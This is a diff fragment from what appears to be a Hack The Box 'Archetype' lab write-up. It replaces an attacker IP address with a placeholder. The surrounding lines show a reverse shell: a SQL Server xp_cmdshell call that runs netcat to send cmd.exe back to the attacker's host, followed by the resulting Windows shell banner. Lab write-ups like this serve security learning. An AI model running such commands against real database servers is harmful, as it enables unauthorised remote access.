@@ -200,7 +200,7 @@ NULL
 SQL (ARCHETYPE\sql_svc  dbo@msdb)> EXEC xp_cmdshell 'powershell -c cd C:\Users\sql_svc\Downloads ; .\nc64.exe -e cmd.exe <MY IP ADRESS> 443';
 ```
 ```
-connect to [10.10.14.172] from (UNKNOWN) [10.129.207.19] 49678
+connect to [MY ADRESS IP] from (UNKNOWN) [10.129.207.19] 49678
 Microsoft Windows [Version 10.0.17763.2061]
 (c) 2018 Microsoft Corporation. All rights reserved.
 
